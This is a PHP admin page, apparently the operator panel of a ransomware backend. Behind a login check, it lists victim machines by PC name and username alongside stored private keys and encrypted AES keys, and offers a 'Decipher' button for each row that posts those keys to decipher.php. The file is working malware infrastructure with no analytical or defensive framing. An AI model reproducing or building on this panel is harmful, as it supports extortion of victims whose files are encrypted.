<?php

session_start();

if( $_SESSION['auth'] != 1 ) {
    header("Location: login.php");
    exit;
}

include 'db.php';

$q = $connection->query('SELECT * FROM chiavi');

?>

<html>
  <head>
    <style type="text/css">
    body,table{font-family:Arial,Helvetica,sans-serif}body,html{height:100%}a,abbr,acronym,address,applet,b,big,blockquote,body,caption,center,cite,code,dd,del,dfn,div,dl,dt,em,fieldset,font,form,html,i,iframe,img,ins,kbd,label,legend,li,object,ol,p,pre,q,s,samp,small,span,strike,strong,sub,sup,table,tbody,td,tfoot,th,thead,tr,tt,u,ul,var{margin:0;padding:0;border:0;outline:0;font-size:100%;vertical-align:baseline;background:0 0}body{line-height:1;margin:0;width:520px}ol,ul{list-style:none}blockquote,q{quotes:none}blockquote:after,blockquote:before,q:after,q:before{content:'';content:none}:focus{outline:0}del{text-decoration:line-through}a:link,a:visited,table a:link{color:#666;font-weight:700;text-decoration:none}a:active,a:hover,table a:active,table a:hover{color:#bd5a35;text-decoration:underline}table a:visited{color:#999;font-weight:700;text-decoration:none}table{border-spacing:0;color:#666;font-size:12px;text-shadow:1px 1px 0 #fff;background:#eaebec;margin:20px;border:1px solid #ccc;-moz-border-radius:3px;-webkit-border-radius:3px;border-radius:3px;-moz-box-shadow:0 1px 2px #d1d1d1;-webkit-box-shadow:0 1px 2px #d1d1d1;box-shadow:0 1px 2px #d1d1d1}table th,table tr td{border-bottom:1px solid #e0e0e0}table th{padding:21px 25px 22px;border-top:1px solid #fafafa;background:#ededed;background:-webkit-gradient(linear,left top,left bottom,from(#ededed),to(#ebebeb));background:-moz-linear-gradient(top,#ededed,#ebebeb)}table th:first-child{text-align:left;padding-left:20px}table tr:first-child th:first-child{-moz-border-radius-topleft:3px;-webkit-border-top-left-radius:3px;border-top-left-radius:3px}table tr:first-child th:last-child{-moz-border-radius-topright:3px;-webkit-border-top-right-radius:3px;border-top-right-radius:3px}table tr{text-align:center;padding-left:20px}table tr td:first-child{text-align:left;padding-left:20px;border-left:0}table tr td{padding:18px;border-top:1px solid #fff;border-left:1px solid #e0e0e0;background:#fafafa;background:-webkit-gradient(linear,left top,left bottom,from(#fbfbfb),to(#fafafa));background:-moz-linear-gradient(top,#fbfbfb,#fafafa)}table tr.even td{background:#f6f6f6;background:-webkit-gradient(linear,left top,left bottom,from(#f8f8f8),to(#f6f6f6));background:-moz-linear-gradient(top,#f8f8f8,#f6f6f6);width:300px;}table tr:last-child td{border-bottom:0}table tr:last-child td:first-child{-moz-border-radius-bottomleft:3px;-webkit-border-bottom-left-radius:3px;border-bottom-left-radius:3px}table tr:last-child td:last-child{-moz-border-radius-bottomright:3px;-webkit-border-bottom-right-radius:3px;border-bottom-right-radius:3px}table tr:hover td{background:#f2f2f2;background:-webkit-gradient(linear,left top,left bottom,from(#f2f2f2),to(#f0f0f0));background:-moz-linear-gradient(top,#f2f2f2,#f0f0f0)}table { width: 1200px;table-layout: fixed; }td { width: 25%; word-break:break-all; }
	</style>
  </head>
  <body>

	<table cellspacing='0'>
	  <tr><th>Pc Name</th><th>Username</th><th>Private Key</th><th>Encrypted AES Key</th><th>Decipher</th></tr>
	  
	  <?php
	  	$i = 0;
	  	
	  	foreach($q AS $row) {
	  		echo "<tr" . ($i % 2 ? " class='even'" : "") . ">
	  		<td>".htmlentities($row[pcname])."</td>
	  		<td>".htmlentities($row[username])."</td>
	  		<td>".htmlentities($row[privatekey]) . "</td>
	  		<td>".htmlentities($row[aesencrypted])."</td>
	  		<td>
	  		 <form action=\"decipher.php\" method=POST>
				<input type=\"hidden\" name=\"privatekey\" value=\"" . htmlentities($row[privatekey]) . "\">
				<input type=\"hidden\" name=\"aesencrypted\" value=\"" . htmlentities($row[aesencrypted]) . "\">
				<input type=\"submit\" value=\"Decipher\">
			</form>
	  		</td>
	  		</tr>";
	  		$i++;
	  	}
	  ?>
	</table>
  </body>
</html>
